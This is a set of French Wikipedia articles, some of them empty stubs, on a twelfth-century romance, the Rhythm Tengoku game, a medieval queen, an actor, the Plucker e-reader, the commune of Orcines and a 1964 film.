<doc id="2845893" url="https://fr.wikipedia.org/wiki?curid=2845893" title="Franklin Quest Field">
Franklin Quest Field



</doc>
<doc id="2845897" url="https://fr.wikipedia.org/wiki?curid=2845897" title="Roman d'Énéas">
Roman d'Énéas

Le Roman d'Énéas est un roman anonyme ; la date de rédaction du premier manuscrit est estimée à 1160. On considère ce texte comme un des plus anciens romans français (ou le plus ancien selon la définition que l'on donne au mot « roman »).
L'histoire.
"Le Roman d'Énéas" est une adaptation de l’"Énéide" de Virgile que l'auteur traduit du latin, parfois fidèlement, parfois en se permettant des libertés qui font de ce texte une véritable création littéraire.
Comme chez Virgile, le roman relate les voyages et les combats du troyen Énée, ancêtre mythique du peuple romain. Le clerc du transforme néanmoins l'épopée latine, récit de fondation concentré sur le thème guerrier, en une œuvre romanesque qui développe largement la thématique de l'amour.
Sommaire.
L’histoire commence avec la description de la ville de Troie en flammes. Énéas et ses hommes fuient, mais ils sont pris dans une grande tempête, créée par Junon. Plusieurs jours plus tard, ils s'éloignent de la tempête et se rendent à Carthage, où habite une reine nommée Didon. Quand la reine rencontre les Troyens, elle les accueille et promet leur sécurité. Énéas et Didon commencent une relation amoureuse, à cause de Vénus, qui agit par l'intermédiaire de son fils Cupidon. La relation entre Énéas et Didon n’est pas égale : Didon aime Énéas beaucoup plus qu’elle n'est aimée de lui. Les rumeurs de leur relation commencent à se répandre parmi les citoyens de Didon. Les dieux ordonnent à Énéas de quitter Carthage et trouver son destin en Lombardie. Didon veut l’accompagner, mais Énéas refuse. Quand Didon voit qu’Énéas est parti, elle se suicide.
Pendant le voyage d’Énéas vers la Lombardie, il visite les Enfers et parle avec son père au sujet de son destin. Il y voit aussi Didon, qui ignore sa présence. Énéas et ses hommes arrivent en Lombardie où le roi Latinus promet la main de sa fille, Lavine, à Énéas. Cependant, la mère de Lavine ne veut pas que sa fille épouse Énéas, donc elle fait part de ce nouvel arrangement à Turnus, l'ancien fiancé de Lavine. Une guerre commence entre Turnus et Énéas, Ascanius tue un cerf, qui commence une bataille avec Tyrrhus, et les Troyens gagnent. Turnus sollicite l’aide de plusieurs villes pour commencer une guerre contre les Troyens. Un des guerriers, une femme s’appelant Camille, chef des Volsques, rejoint la bataille du côté des Italiens. Vénus convainc Vulcain de fabriquer des armes pour protéger son fils Énéas dans la bataille. Turnus brûle la flotte des Troyens. Deux Troyens, Nisus et Euryale, décident d’infiltrer le camp des ennemis et attaquent pendant leur sommeil. Cependant, tous les deux sont capturés et tués. Énéas convainc un autre roi de l’aider dans la guerre, et ce roi envoie son fils Pallas, mais Pallas est tué dans la bataille. Une trêve est décidée pour les deux armées afin d'enterrer leurs morts, mais par la suite les batailles recommencent. Camille est tuée, et Turnus demande un combat singulier avec Énéas pour gagner Lavine et la terre. Lavine tombe amoureuse d'Énéas et promet de se suicider s'il meurt pendant le combat. Lavine envoie une lettre à Énéas où elle déclare son amour pour lui mais, bien qu'il l’aime aussi, il ne lui répond pas. Le jour du combat arrive, et une grande bataille commence. À la fin, Énéas tue Turnus par vengeance pour la mort de Pallas. Lavine et Énéas se marient.
Contexte historique et géographique.
"Le Roman d'Énéas" fut écrit en Normandie autour de 1160. À cette époque, Henri II était le duc de Normandie depuis 1150. Henri II était un membre de la dynastie Plantagenêt. En même temps que duc de Normandie, il était aussi roi d'Angleterre, duc d'Aquitaine et comte d'Anjou. En France, pendant cette époque, chaque province avait sa propre aristocratie. La Normandie était un duché, et chaque duché rendait l'hommage au roi de France. Henri II fut le premier roi d'Angleterre à rendre cet hommage au roi de France. En 1152, Henri II épousa Aliénor d'Aquitaine. Aliénor d'Aquitaine était connue comme mécène des arts, en particulier des écrivains et poètes. Elle était également connue pour ses cours d'amour. Durant l'année 1160, le mariage du fils de Henri II et Aliénor d'Aquitaine, Henri le Jeune, et de la fille de Louis VII de France, Marguerite, fut organisé. Henri le Jeune avait alors cinq ans et Marguerite deux ans. Le mariage était utilisé comme un outil politique par Henri II.
L'auteur.
L'auteur du "Roman d'Énéas" est inconnu. Il était probablement trouvère. Les trouvères avaient l'habitude de prendre une histoire et de l'adapter en la modifiant grandement, créant ainsi une nouvelle œuvre. Souvent, dans de tels cas, le but, le propos et le genre original sont perdus. En l'occurrence, l'histoire originale était "l'Énéide" de Virgile, mais dans l"'Énéas", l'auteur et la source ne sont pas mentionnés. L'auteur appartiendrait à l'école littéraire normande qui s'était formée à la cour des Plantagenêts.
Le langage.
Le texte original du "Roman d'Énéas" est en français, le texte étant écrit en Normandie. Dans "Le Roman d'Énéas", comme dans la plupart des romans antiques, l'auteur utilise l'octosyllabe rimé. Ce texte est « marqué par certains traits de l'Ouest, et certains traits picards ». Selon les différents manuscrits, les traits picards sont variés.
La datation.
Il y a quelques possibilités pour la date d'écriture du "Roman d'Énéas" : on admet généralement une date proche de 1160, mais les dates de 1150, 1160, et 1174 ont été suggérées. Le chercheur M. Hoepffner estime que "le Roman d'Énéas" a été écrit après 1155. Il suppose qu'en raison des similarités entre "Le Roman d'Énéas" et "Le Roman de Brut", "Le Roman d'Énéas" doit avoir été écrit après le "Roman de Brut", donc après l'année 1155, année de rédaction du "Roman de Brut". Il voit beaucoup de similarités entre les deux livres, comme le début de l'histoire après la guerre de Troie et avant l'épisode à Carthage. Mais d'autres chercheurs croient que "le Roman d'Énéas" précéda le "Roman de Brut". Ils croient au contraire que les similitudes entre les deux romans sont le fait de Wace, auteur du "Roman de Brut", qui aurait utilisé le "Roman d'Énéas" comme source d'inspiration. Si c'est effectivement le cas, alors la date du "Roman d'Énéas" doit être placée avant 1155. Un dernier argument en faveur de la précocité du "Roman d'Énéas" tient au fait qu'il est anonyme, alors que Wace était un des premiers auteurs professionnels et revendiqués comme tels. Il paraît dès lors improbable qu'un auteur postérieur au "Roman de Brut", particulièrement s'il était inspiré par ce dernier, n'ait pas signé son œuvre.
Postérité.
Le "Roman d'Éneas" est la source de l’"Eneide" (ou "Eneit") d'Hendrik van Veldeke ( vers), premier chef d’œuvre de la littérature courtoise du moyen haut allemand, achevé entre 1187 et 89.

</doc>
<doc id="2845898" url="https://fr.wikipedia.org/wiki?curid=2845898" title="Rhythm Tengoku">
Rhythm Tengoku

 est un jeu de rythme (jeu d'action basé sur le rythme) développé par Nintendo R&amp;D1. Il est sorti au Japon le , et a été le dernier jeu développé par Nintendo sur Game Boy Advance. Le jeu a reçu un prix d'Excellence catégorie Divertissement lors du Japan Media Arts Festival en 2006.
Système de jeu.
"Rhythm Tengoku", avec son gameplay et ses graphismes simplistes, propose beaucoup de similitudes avec la série des "WarioWare". Chaque niveau du jeu est un mini-jeu qui demande au joueur d'accomplir certaines actions en se synchronisant avec la musique pour créer un rythme. Par exemple, dans un niveau, un rythme est créé en frappant des balles de baseball lorsqu'elles traversent l'écran. Plus le joueur est synchronisé avec la musique, meilleure sera sa note. La note maximum que le joueur peut atteindre est de 140 points, elle augmente et diminue au gré des réussites et échecs du joueur dans les mini-jeux.
Le jeu est divisé en plusieurs étapes, chaque étape étant divisée en six niveaux, chaque niveau étant un mini-jeu. Seul le premier niveau de la première étape est disponible lorsque l'on commence le jeu. Une fois un niveau terminé, le joueur reçoit un classement : "À refaire", "Médiocre", "Très bien". Un nouveau niveau est débloqué si le joueur obtient un classement "Médiocre" ou "Très bien". Le sixième niveau de chaque étape est un mélange des cinq premiers niveaux. Il y a 8 étapes dans le jeu, pour un total de 48 niveaux.
Une fois que le joueur a obtenu un classement "Très bien" sur tous les mini-jeux, le mode "Parfait" apparaît. Dans ce mode, un mini-jeu est choisi aléatoirement, soit le joueur tente sa chance dans ce niveau en mode "Parfait", soit il joue à un autre mini-jeu "normalement". S'il tente le mode "Parfait", la moindre erreur de rythme est fatale. Une fois un mini-jeu terminé sans erreur, un certificat, propre à ce mini-jeu, est remis au joueur. Si le joueur échoue 3 fois au mode "Parfait" d'un niveau, un autre niveau est choisi aléatoirement et c'est dans celui-ci que le joueur devra tenter le mode "Parfait". Une fois tous les niveaux terminés en mode "Parfait", un certificat spécial est débloqué.
Au fur et à mesure que l'on débloque les 48 niveaux du mode principal, des mini-jeux complémentaires à la quête principale apparaissent : cours de batterie, concerts, et autres mini-jeux toujours basés sur le rythme.
Développement.
Le producteur de musique japonais Tsunku (connu pour son projet musical Hello! Project avec Morning Musume) est à l'origine du concept du jeu sur lequel il a travaillé avec Yoshio Sakamoto (Nintendo). Il a aussi contribué au jeu en fournissant 30 musiques différentes pour la bande son de celui-ci. La participation de Tsunku n'a été révélée que le jour de la sortie du jeu. Tsunku apparaît dans le jeu sous les traits du "Samouraï de la batterie", un personnage donnant des cours de musique au joueur. Le jeu a été développé par l'équipe qui est à l'origine de "WarioWare", ce qui explique les similitudes aux niveaux des graphismes, du sons et du gameplay qu'il y'a entre les deux jeux.
Version arcade.
Une version arcade du jeu est sortie le . Cette version a été développée par Nintendo et Sega, il s'agit là de la première collaboration entre les deux sociétés depuis "F-Zero AX". Contrairement à la version originale sur Game Boy Advance, la version arcade propose un mode 2 joueurs durant lequel la similitude des performances des joueurs est notée. Le jeu se présente de la même façon que sur GBA, et les mini-jeux sont exactement les mêmes à l'exception du mode "tempo up" qui se joue deux fois plus vite que dans la version originale. Un crédit permet au joueur de jouer à deux mini-jeux, symbolisé par deux cœurs dans le bas à gauche de l'écran. Si le joueur termine un niveau avec un classement "Très bien", il gagne un cœur supplémentaire qui lui permet de continuer à jouer. En gagnant suffisamment de cœur, il est possible de jouer à une étape en entier (6 mini-jeux). Chaque fois que le joueur reçoit un classement "À refaire" ou "Médiocre", il perd un cœur. Si le joueur perd tous ses cœurs, il doit remettre de l'argent pour continuer à jouer.
Suite.
Le , une suite du jeu est sortie au Japon sur Nintendo DS sous le nom de "Rhythm Tengoku Gold". Contrairement à "Rhythm Tengoku", cette suite est sortie en Amérique du Nord (sous le nom de "Rhythm Heaven") et en Europe (sous le nom de "Rhythm Paradise").

</doc>
<doc id="2845900" url="https://fr.wikipedia.org/wiki?curid=2845900" title="Marguerite de France (1279-1318)">
Marguerite de France (1279-1318)

Marguerite de France (1279 ? – ) est la fille de , roi de France et de sa seconde épouse, Marie de Brabant.
Mariage et descendance.
En 1299, elle devient reine d'Angleterre en épousant , veuf d'Éléonore de Castille, conformément au traité de Montreuil-sur-Mer signé entre son frère et .
Ils ont trois enfants : 
Veuvage.
Marguerite ne s'est jamais remariée après la mort d'Édouard en 1307, bien qu'elle n'ait eu que 28 ans lorsqu'elle était veuve. Marguerite se retira Château de Marlborough, aujourd'hui disparu, mais resta en contact avec la nouvelle reine, sa nièce Isabelle, et par lettre avec son demi-frère Philippe IV.

</doc>
<doc id="2845911" url="https://fr.wikipedia.org/wiki?curid=2845911" title="Arthur Mazet">
Arthur Mazet

Arthur Mazet est un acteur français né le à Paris.
Biographie.
Il étudie l'art dramatique à l'École technique expérimentale du spectacle, puis au lycée Lamartine. Après un bac L option théâtre, il suit une formation en conservatoire ( et de Paris).
Il débute au théâtre à l’âge de 13 ans dans "Embarquement immédiat" mis en scène par Valérie Drevon, puis dans "Lucrèce Borgia" mis en scène par David Gery. En 2015, il interprète un rôle dans "Le Carton" mis en scène par Davil Roussel et Arthur Jugnot.
À 6 ans, il connaît sa première expérience au cinéma dans "La Cité des enfants perdus" de Marc Caro et Jean-Pierre Jeunet mais c’est à 15 ans qu’on le découvre dans "Nos jours heureux" d'Olivier Nakache et Éric Toledano.
Il travaille ensuite avec Claude Miller dans "Un secret" et Richard Berry dans "L'Immortel".
En 2010, il se rend pour la première fois au Festival de Cannes pour le film "Simon Werner a disparu...", sélectionné dans la section "Un certain regard". Le film est réalisé par Fabrice Gobert, qu’il retrouvera quelques années plus tard pour son deuxième film "K.O."
Il forme un trio avec Antoine Duléry et Fred Testot dans "Sea, No Sex and Sun" de Christophe Turpin. Il est à l’affiche de "20 ans d'écart" de David Moreau et de "La Ritournelle" de Marc Fitoussi.
En 2016, il est à nouveau au Festival de Cannes, en compétition officielle avec "Elle" de Paul Verhoeven, mais aussi "Victoria" de Justine Triet, sélectionné pour la "Semaine de la critique". Il revient au Festival de Cannes pour "Nos années folles" d'André Téchiné.
Arthur Mazet interprète le rôle principal dans "La Colle" d'Alexandre Castagnetti.
Parallèlement il participe à des courts-métrages, notamment "Casse gueule" de Clément Gonzalez. Le film est vainqueur du 48h Film Project et Arthur Mazet remporte le prix du meilleur acteur.
Il joue aux côtés de Denis Lavant dans "Directed By" d'Alban Mench, et dans "Troc mort" de Martin Darondeau film qui remporte de nombreux prix.
Il participe à la websérie "En passant pécho".
À la télévision, il joue dans de nombreuses séries comme "Profilage", "Clem", "Victoire Bonnot" ou encore "Lebowitz contre Lebowitz".
Depuis 2017, il a un rôle principal aux côtés d'Isabelle Gélinas dans "Crimes parfaits" (prix du public au Festival de Luchon) une série réalisée par Didier Le Pêcheur et Philippe Bérenger.
En 2020, il donne la réplique à Corinne Masiero dans l'épisode "Au nom du fils" de la série à succès Capitaine Marleau réalisée par Josée Dayan.
Le 17 décembre 2020, il est à l'affiche de la nouvelle série OCS "3615 Monique" réalisée par Simon Bouisson dans laquelle il interprète un des rôles principaux aux côtés de Noémie Schmidt et Paul Scarfoglio.
La saison 2 de "3615 Monique," réalisée par Guillaume Renusson, a été tournée en mars 2022 entre Angoulême et Paris. 

</doc>
<doc id="2845914" url="https://fr.wikipedia.org/wiki?curid=2845914" title="La Résidence Vimanmek">
La Résidence Vimanmek



</doc>
<doc id="2845927" url="https://fr.wikipedia.org/wiki?curid=2845927" title="Tiers parti">
Tiers parti

Un tiers parti désigne un parti ou groupement politique, qui se présente comme une alternative à l'antagonisme des deux principaux partis des systèmes démocratiques politiques bipartisans. Les tiers partis cherchent à outrepasser le clivage politique, traditionnellement entre droite et gauche, qui domine les débats démocratiques.
Exemples historiques.
États-Unis.
Aux États-Unis, le terme de "third party" désigne un parti politique alternatif aux partis républicain et démocrate. Souvent, appelés "independent candidates", ce sont toujours les candidats de parti tiers qui occupe les troisièmes places des élections présidentielles. 
Parmi les exemples de "third parties" :
France.
Dans l'histoire de France, l'expression « tiers parti » recouvre plusieurs périodes :

</doc>
<doc id="2845933" url="https://fr.wikipedia.org/wiki?curid=2845933" title="Plucker">
Plucker

Plucker est un lecteur Web offline et lecteur libre eBook pour Palm OS, Windows Mobile (PocketPC), et autres agendas électroniques.
Plucker fonctionne sous UNIX, Linux, Microsoft Windows et Mac OS X.
Les pages désirées sont retravaillées, compressées et transférées sur un PDA pour être accessible avec le visionneur Plucker
Plucker supporte différentes caractéristiques dont
Il est possible de générer une version statique de Wikipédia pour pouvoir la consulter sur un agenda électronique sans devoir se connecter à Internet.
Plucker est sous licence GPL.

</doc>
<doc id="2845934" url="https://fr.wikipedia.org/wiki?curid=2845934" title="Parti bonapartiste">
Parti bonapartiste



</doc>
<doc id="2845935" url="https://fr.wikipedia.org/wiki?curid=2845935" title="Fontanas">
Fontanas



</doc>
<doc id="2845936" url="https://fr.wikipedia.org/wiki?curid=2845936" title="Palais Bhupin">
Palais Bhupin



</doc>
<doc id="2845937" url="https://fr.wikipedia.org/wiki?curid=2845937" title="Orcines">
Orcines

Orcines () est une commune française située dans le département du Puy-de-Dôme, en région Auvergne-Rhône-Alpes. Elle fait partie de l'aire d'attraction de Clermont-Ferrand. Elle est située dans la couronne périurbaine de Clermont-Ferrand.
Géographie.
Localisation.
Cette localité du Massif central se trouve au cœur de la chaîne des Puys, à une altitude de , à l'ouest de Clermont-Ferrand. Le puy de Dôme, qui culmine à , est situé sur le territoire de la commune.
Outre Orcines proprement dit, la commune comprend aussi quinze villages ou lieux-dits : Ternant, Sarcenat, La Fontaine du Berger, Chez Vasson, Le Gressigny, Solagnat, La Baraque, Villars, La Font de l'Arbre, Montrodeix, Enval, Le Cheix, Bonnabry, Bellevue et Fontanas, l'un des plus remarquables.
Communes limitrophes.
Neuf communes sont limitrophes d'Orcines :
Géologie et relief.
La superficie de la commune est de ; son altitude varie entre 480 et .
Voies de communication et transports.
Voies routières.
La commune d'Orcines est traversée par plusieurs routes départementales, dont deux majeures reliant la capitale auvergnate à l'ouest du département (vers Limoges et Tulle).
La route départementale 941, au départ de Clermont-Ferrand, emprunte une montée (route du Puy-de-Dôme, rampe de 10 %) aménagée à deux voies dans le sens de la montée et une dans le sens de la descente, jusqu'à La Baraque. Elle continue vers Saint-Ours, Pontgibaud, l'autoroute A 89 et Limoges. C'est aussi par cette route que l'on accède au centre-ville par la route départementale 90. Un point de vue avec table d'orientation a été aménagé, sur le territoire de la commune d'Orcines, au droit d'un virage, offrant une vue panoramique sur Clermont-Ferrand, au-dessus du quartier des Hauts de Chamalières. Jusqu'en 2006, il s'agissait, entre Clermont-Ferrand et La Baraque, de la (section de l'ancienne ) et, entre La Baraque et Pontgibaud, de la (section de l'ancienne ).
La route départementale 942 (anciennement ) relie La Baraque à Nébouzat en direction de Tulle par la , ancienne route nationale 89 ; elle dessert La Font de l'Arbre au carrefour giratoire avec la .
Au sud du centre-bourg, Fontanas et La Font de l'Arbre sont traversées par la en provenance de Royat. Celle-ci continue à l'ouest vers le parking du Panoramique des Dômes (chemin de fer à crémaillère permettant d'accéder au sommet du Puy de Dôme) et Ceyssat.
La relie du nord au sud les villages de Ternant et de Fontanas "via" le centre-ville.
La , en provenance de Durtol, dessert les hameaux de Villars, de Fontanas et de Montrodeix.
Au nord de la commune, la dessert le hameau de Ternant. Elle croise la , desservant les lieux-dits du Gressigny et de Bonnabry, ainsi que la (vers La Fontaine du Berger) et la (vers Chanat-la-Mouteyre). Il existe aussi une .
Transports en commun.
Orcines est desservie par le transport à la demande du réseau T2C. Fonctionnant du lundi au samedi, il permet des correspondances avec les lignes fortes du réseau (notamment le tramway et les lignes de bus B et C).
Transports ferroviaires.
Orcines ne possède pas de gare ferroviaire. La ligne ferroviaire la plus proche appartenant au réseau ferré national est la ligne d'Eygurande - Merlines à Clermont-Ferrand ; la gare la plus proche est celle de Durtol - Nohanent accessible depuis le centre-ville par les et 559 ou par la route de Champiot () depuis Villars.
La voie du Panoramique des Dômes est à écartement de (voie métrique).
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat de montagne, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat de montagne ou de marges de montagne et est dans une zone de transition entre les régions climatiques « Ouest et nord-ouest du Massif Central » et « Nord-est du Massif Central ». Elle est en outre dans la zone H1c au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique installée sur la commune est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Orcines est catégorisée bourg rural, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine d'Orcines, une unité urbaine monocommunale constituant une ville isolée. Par ailleurs la commune fait partie de l'aire d'attraction de Clermont-Ferrand, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d’occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des forêts et milieux semi-naturels (61 % en 2018), une proportion sensiblement équivalente à celle de 1990 (61,5 %). La répartition détaillée en 2018 est la suivante : 
forêts (52,9 %), prairies (15 %), zones agricoles hétérogènes (14,8 %), milieux à végétation arbustive et/ou herbacée (8,1 %), zones urbanisées (7,4 %), espaces verts artificialisés, non agricoles (1,9 %). L'évolution de l’occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Logement.
Dans un environnement verdoyant à forte emprise agricole, à seulement de l'ancienne capitale régionale, l'habitat dispersé des nombreux hameaux d'Orcines constitue une sorte de banlieue résidentielle où les villas bien entourées le disputent aux grandes fermes restaurées.
En 2014, la commune comptait , contre en 2009. Parmi ces logements, 88,3 % étaient des résidences principales, 4,4 % des résidences secondaires et 7,3 % des logements vacants. Ces logements étaient pour 9,4 % d'entre eux des maisons individuelles et pour 10,2 % des appartements.
La proportion des résidences principales, propriétés de leurs occupants était de 82,6 %, en hausse sensible par rapport à 2009 (82 %). La part de logements HLM loués vides était de 0,7 % (contre 0,4 %).
Risques naturels et technologiques.
La commune est soumise à plusieurs risques :
Elle n'est pas dotée d'un dossier d'information communal sur les risques majeurs, ni d'un plan communal de sauvegarde.
Douze cavités souterraines sont recensées sur la commune.
Toponymie.
L'étymologie d'Orcines, du latin "ursinus", est présente à travers l'ours noir qui lui fait face. Ce nom deviendra "Orsinas" en auvergnat et "Orcines" en français.
Par le passé, Orcines s'écrivait "Oreines" sous l'an II et "Orienes et Villars" sous le "Bulletin des lois".
"Fontanas", petit village proche de Royat, tire son nom de l'ancien auvergnat "fontanas" qui, avec ce pluriel, veut dire « les fontaines » voire une grosse fontaine et dériverait dans ce cas de . Les nombreuses fontaines qui sont disposées à chaque coin de rues confirment cette origine.
Histoire.
L'histoire d'Orcines est liée à celle du puy de Dôme, auquel il faut se reporter pour les données concernant l’édification du temple de Mercure par les Romains, ou encore les expériences sur la pression atmosphérique menées par Blaise Pascal. L'agglomération romaine du col de Ceyssat se trouve au sud du puy de Dôme, sur les communes de Ceyssat, Orcines et Saint-Genès-Champanelle.
Le village lui-même a longtemps vécu de l'élevage des moutons, ainsi que de la cueillette des genêts, que les boulangers des alentours achetaient aux habitants pour chauffer leurs fours.
Aujourd'hui le village vit toujours de l'élevage, mais aussi des céréales et du bois, et bénéficie de l'essor touristique de la région : activités sportives, randonnées, curiosités géologiques, auxquelles s'ajoute l'attrait du tout proche complexe culturel et scientifique Vulcania, situé dans le parc naturel régional des volcans d'Auvergne.
Politique et administration.
Découpage territorial.
De 1793 à 1801, la municipalité s'appelait "Oreines et Montrodes" ; elle dépendait de l'arrondissement de Clermont-Ferrand et du canton de Chamalières.
En 1801, elle est rattachée au canton de Clermont-Ferrand-Nord. Le décret du , paru au Journal officiel le , modifie le découpage de certains cantons dans l'agglomération clermontoise. En lieu et place de cette ancienne fraction de canton, quatre cantons sont créés, dont un canton de Royat comprenant cinq communes incluant Orcines.
À la suite du redécoupage des cantons du département, il est créé un canton d'Orcines regroupant vingt-trois communes (décret du ). Depuis les élections départementales de , Orcines est le bureau centralisateur de ce canton.
Tendances politiques et résultats.
Aux élections législatives de 2012, la députée Danielle Auroi, élue dans la , n'a pas recueilli la majorité des voix au second tour (48,21 %). 67,09 % des électeurs ont voté.
Aux élections municipales de 2014, le maire sortant, Jean-Marc Morvan, s'est représenté et a remporté les élections au avec un score de 57,61 % des voix, dix-huit sièges au conseil municipal dont deux au conseil communautaire. Il bat Denis Cheville (candidat DVG) qui n'obtient que cinq sièges au conseil municipal. Le taux de participation s'élève à 75,61 %.
Aux élections européennes de 2014, la commune a voté en majorité pour la liste UMP de Brice Hortefeux avec 23,55 % des voix ; la liste FN arrive en deuxième position avec 17,66 % des voix. Le taux de participation est de 53,37 %.
Aux élections départementales de 2015, le binôme Martine Bony - Jean-Marc Boyer (Union de la droite) a recueilli 53,45 % des voix ( sur ), suivant la tendance du canton dont ce binôme a été élu au premier tour. Le taux de participation est de 58,22 % ( sur ).
Aux élections européenne de 2024, la commune vote en majorité pour le RN à 22,6 %, Renaissance à 19,3 % et le PS à 17,6 %. Avec un taux de participation de 64,56 %.
Administration municipale.
Compte tenu de la population ( en 2011), vingt-trois membres sont élus au conseil municipal.
Le conseil municipal a désigné, le , cinq adjoints et dix-sept conseillers municipaux (3 au bourg, 2 à Montrodeix, Ternant, La Font de l'Arbre et à Chez Vasson et 1 à Villars, Bellevue, Bournazet, Le Cheix, Solagnat et Le Gressigny).
Population et société.
Démographie.
Pyramide des âges.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 28,7 %, soit en dessous de la moyenne départementale (34,2 %). À l'inverse, le taux de personnes d'âge supérieur à est de 30,0 % la même année, alors qu'il est de 27,9 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,81 % de femmes, légèrement inférieur au taux départemental (51,59 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Enseignement.
Orcines dépend de l'académie de Clermont-Ferrand.
Dans l'enseignement public, la commune gère l'école élémentaire publique située dans le village de La Font de l'Arbre, qui comptabilisait pour l'année scolaire 2014-2015. Ces élèves poursuivent leur scolarité au collège de Chamalières puis dans le lycée polyvalent de la même commune pour les filières générales (ceux de la filière STI2D sont scolarisés au lycée Lafayette ou au lycée Roger-Claustres à Clermont-Ferrand et ceux de la filière STMG au lycée Sidoine-Apollinaire).
Dans l'enseignement privé, le pensionnat Sainte-Anne accueillait pour l'année scolaire 2014-2015. Ces élèves poursuivent leur scolarité au collège Sainte-Anne.
Manifestations culturelles et festivités.
Le four du village a été rénové, ainsi que ceux de Montrodeix et de La Font-de-l'Arbre depuis 2004. Les habitants y organisent des « inter-fours », qui rappellent les fêtes auvergnates d'autrefois : joie, bonne humeur, pain au four, aligot, andouillette maison…
Médias.
Les kiosques vendent "La Montagne" (édition de Clermont-Volcans).
La commune édite un bulletin municipal ainsi que "Les nouvelles d'Orcines".
Économie.
Emploi.
En 2014, la population âgée de quinze à soixante-quatre ans s'élevait à , parmi lesquelles on comptait 76,9 % d'actifs dont 71,7 % ayant un emploi et 5,3 % de chômeurs.
On comptait dans la zone d'emploi. Le nombre d'actifs ayant un emploi résidant dans la zone étant de , l'indicateur de concentration d'emploi s'élève à 33,2 %, ce qui signifie que la commune offre moins d'un emploi par habitant actif.
La répartition des par catégorie socio-professionnelle et par secteur d'activité est la suivante :
 des âgées de quinze ans ou plus (soit 83,5 %) sont des salariés. 14,8 % des actifs travaillent dans la commune de résidence.
Entreprises.
Au , Orcines comptait : 17 dans l'industrie, 30 dans la construction, 53 dans le commerce, le transport, l'hébergement et la restauration, 32 dans les services aux entreprises et 39 dans les services aux particuliers.
En outre, elle comptait .
Agriculture.
Au recensement agricole de 2010, Orcines comptait agricoles. Ce nombre est en diminution par rapport à 2000 (28) et à 1988 (41).
La surface agricole utilisée était de , en diminution par rapport à 2000 ().
Commerce.
La base permanente des équipements de 2014 recense sept commerces : une supérette, deux épiceries, un magasin de meubles, deux magasins d'articles de sports et de loisirs ainsi qu'un fleuriste.
Tourisme.
Orcines possède un office de tourisme.
Au , la commune comptait trois hôtels (un hôtel deux étoiles et deux autres trois étoiles), totalisant , ainsi qu'un camping, situé dans le village de Chez Vasson, ouvert de mai à septembre, non classé avec 
Culture locale et patrimoine.
Lieux et monuments.
Patrimoine religieux.
L'église Saint-Julien est un édifice roman, remanié au . Moderne, son clocher est doté de quatre cloches, l'une de 1823, les trois autres de 1930.
Les stalles, du , disparues car vétustes, sont classées aux monuments historiques au titre objet le . Calice et patène, de la même époque, le sont le .
Patrimoine naturel.
La commune d'Orcines fait partie de plusieurs zones naturelles d'intérêt écologique, faunistique et floristique (ZNIEFF) :
Elle est adhérente du parc naturel régional des volcans d'Auvergne.
Personnalités liées à la commune.
C'est dans cette commune, au château de Sarcenat, qu'est né Pierre Teilhard de Chardin en 1881. Une plaque dans l'église d'Orcines rappelle qu'il y a été baptisé.
Le caveau de la famille Michelin se trouve dans le cimetière d'Orcines.
Eugene Bullard, pilote de chasse afro-américain, séjourna au camp de La Fontaine du Berger de janvier 1918 jusqu'à l'Armistice.
Notes et références.
Références.
Insee.
Dossier relatif à la commune

</doc>
<doc id="2845939" url="https://fr.wikipedia.org/wiki?curid=2845939" title="Les Félins">
Les Félins

Les Félins est un film français réalisé par René Clément et sorti en 1964.
Synopsis.
Des tueurs, à la solde d’un puissant gangster américain, sont à la poursuite de Marc, l’amant de sa femme, réfugié sur la Côte d’Azur. Les tueurs mettent rapidement la main sur lui et il passe un mauvais moment. Mais, alors qu'ils s'apprêtent à le liquider dans un endroit désert, il réussit par miracle à leur échapper.
Il parvient à se cacher au sein d'une institution charitable, où il est repéré par deux bienfaitrices : Barbara, une veuve milliardaire et Melinda sa cousine et proche collaboratrice. Toutes deux, qui vivent seules dans une vaste et luxueuse villa, ont besoin d'un homme à tout faire.
L'atmosphère est étrange au sein de la villa et Marc comprend bientôt qu’il n’a pas été choisi au hasard : Barbara a besoin de lui pour une raison bien précise. Quant à Melinda, elle ne tarde pas à tomber amoureuse du jeune homme. L'ambiance devient vite délétère au sein de ce trio, alors que dans la villa se cache un autre homme. En outre, les tueurs à la recherche de Marc rôdent car ils ne peuvent pas se permettre de rentrer les mains vides aux Etats-Unis : il leur faut absolument la peau de Marc.
Tournage.
Le tournage s'est déroulé du 2 octobre au 7 décembre 1963. Le tournage en studio a eu lieu à La Victorine à Nice ainsi qu'aux Studios Éclair d'Épinay-sur-Seine. Les extérieurs se déroulent à Nice, à Beausoleil ainsi qu'à la Villa Torre Clementina dans la commune de Roquebrune-Cap-Martin dans les Alpes-Maritimes ; à Saint-Raphaël dans le Var ; à Monaco et à New York.

</doc>
<doc id="2845940" url="https://fr.wikipedia.org/wiki?curid=2845940" title="Candidat officiel">
Candidat officiel

